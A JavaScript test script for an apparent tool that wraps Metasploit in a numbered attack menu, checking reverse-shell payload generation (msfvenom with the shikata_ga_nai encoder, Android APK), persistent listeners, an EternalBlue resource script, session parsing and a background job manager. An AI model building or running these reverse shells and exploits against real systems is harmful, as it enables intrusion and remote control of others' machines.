// Phase 13 (METASPLOIT + jobs) tests — attack menu, payload-with-IP, resource scripts, session parse, and the
// persistent background job manager. Mostly deterministic; the job test spawns a real short-lived process.
// Run: node scripts/test-metasploit.mjs
import { localIps, bestLhost, renderMenu, ATTACK_MENU, pickAttack, parseMsfArgs, buildAttack, msfconsoleCmd, detectIpCommand, parseMsf, ENSURE_MSF } from '../src/services/metasploit/index.js';
import { startJob, readJob, writeJob, stopJob, listJobs } from '../src/services/exec/jobs.js';

let pass = 0, fail = 0;
const ok = (n, c, e = '') => { if (c) { pass++; console.log(`  ✅ ${n}`); } else { fail++; console.log(`  ❌ ${n} ${e}`); } };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

console.log('\n[1] device IP detection (LHOST for testing on your own device)');
ok('localIps returns IPv4, non-internal', Array.isArray(localIps()) && localIps().every((x) => /^\d+\.\d+\.\d+\.\d+$/.test(x.ip)));
ok('bestLhost is an IP', /^\d+\.\d+\.\d+\.\d+$/.test(bestLhost()));
ok('detectIp command probes LAN + public', /LAN IPs/.test(detectIpCommand()) && /ipify|ifconfig\.me/.test(detectIpCommand()));

console.log('\n[2] numbered attack menu + matching');
ok('menu has >=10 attacks', ATTACK_MENU.length >= 10);
ok('renderMenu numbers them', /1\. Windows reverse shell/.test(renderMenu()) && /3\. Android/.test(renderMenu()));
ok('pick by number', pickAttack('1')?.id === 1 && pickAttack('3')?.id === 3);
ok('pick by keyword: android', pickAttack('android apk')?.id === 3);
ok('pick by keyword: eternalblue', pickAttack('eternalblue')?.id === 9);
ok('pick by keyword: handler', pickAttack('start a listener')?.id === 8);
ok('unknown -> null', pickAttack('quantum teleport') === null);

console.log('\n[3] arg parsing (key=value AND positional)');
ok('key=value', (() => { const a = parseMsfArgs('1 lhost=10.0.0.5 lport=5555 rhost=1.2.3.4'.split(' ')); return a.lhost === '10.0.0.5' && a.lport === '5555' && a.rhost === '1.2.3.4'; })());
ok('positional (ip + port)', (() => { const a = parseMsfArgs('1 192.168.1.50 4444'.split(' ')); return a.lhost === '192.168.1.50' && a.lport === '4444'; })());
ok('two ips -> lhost + rhost', (() => { const a = parseMsfArgs('9 192.168.1.50 10.10.10.10'.split(' ')); return a.lhost === '192.168.1.50' && a.rhost === '10.10.10.10'; })());

console.log('\n[4] payload built with the USER IP + matching handler');
const win = buildAttack(ATTACK_MENU[0], { lhost: '192.168.1.50', lport: 4444 });
ok('windows venom uses the IP + exe + encoder', /msfvenom -p windows\/x64\/meterpreter\/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe/.test(win.venom) && /shikata_ga_nai/.test(win.venom));
ok('handler is a multi/handler that stays alive (-j, ExitOnSession false)', /multi\/handler/.test(win.handler) && /exploit -j/.test(win.handler) && /ExitOnSession false/.test(win.handler));
const apk = buildAttack(pickAttack('android'), { lhost: '10.0.0.9' });
ok('android -> apk payload', /android\/meterpreter\/reverse_tcp/.test(apk.venom) && /shell\.apk/.test(apk.venom));
const exp = buildAttack(pickAttack('eternalblue'), { lhost: '192.168.1.50', rhost: '10.10.10.10' });
ok('exploit builds a resource script w/ RHOSTS + PAYLOAD + LHOST', /use exploit\/windows\/smb\/ms17_010/.test(exp.resource) && /set RHOSTS 10.10.10.10/.test(exp.resource) && /set LHOST 192.168.1.50/.test(exp.resource));
ok('msfconsoleCmd self-installs + runs the rc', /command -v msfconsole/.test(msfconsoleCmd(win.handler)) && /msfconsole -q -x/.test(msfconsoleCmd(win.handler)));
ok('ENSURE_MSF present', /metasploit-framework/.test(ENSURE_MSF));

console.log('\n[5] session parsing -> findings');
ok('meterpreter session opened -> critical', parseMsf('msfconsole handler', 'Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.77:51000)').some((x) => x.severity === 'critical' && /session 1 opened/.test(x.title)));
ok('command shell session -> critical', parseMsf('msfconsole', 'Command shell session 2 opened (a -> b)').some((x) => x.severity === 'critical'));
ok('no session -> no findings', parseMsf('msfconsole', 'Starting handler...').length === 0);
ok('non-msf command -> []', parseMsf('nmap x', 'Meterpreter session 1 opened (a)').length === 0);

console.log('\n[6] background JOB MANAGER (persistent processes / sessions-alive core)');
const job = await startJob({ command: 'for i in 1 2 3; do echo tick-$i; sleep 0.2; done; echo READY', label: 'test', sessionId: 's1', userId: 'u1' });
ok('job starts (running)', job.status === 'running' && job.id.length >= 4);
await sleep(1000);
const r1 = readJob(job.id, 0);
ok('job streams output incrementally', /tick-1/.test(r1.text) && r1.nextOffset > 0);
ok('listJobs scopes by user', listJobs({ userId: 'u1' }).some((j) => j.id === job.id) && listJobs({ userId: 'other' }).every((j) => j.id !== job.id));
await sleep(600);
const r2 = readJob(job.id, r1.nextOffset);
ok('incremental read from offset (no re-read)', !/tick-1/.test(r2.text) && (/READY/.test(r2.text) || r2.status === 'exited'));
ok('job finished -> exited status', readJob(job.id).status === 'exited');
const j2 = await startJob({ command: 'sleep 30', label: 'long' });
ok('stopJob kills a running job', stopJob(j2.id).ok === true && readJob(j2.id).status === 'stopped');
ok('read unknown job -> error', readJob('nope123').error !== undefined);

console.log(`\n${fail === 0 ? '🎉 ALL PASS' : '💥 FAILURES'} — ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
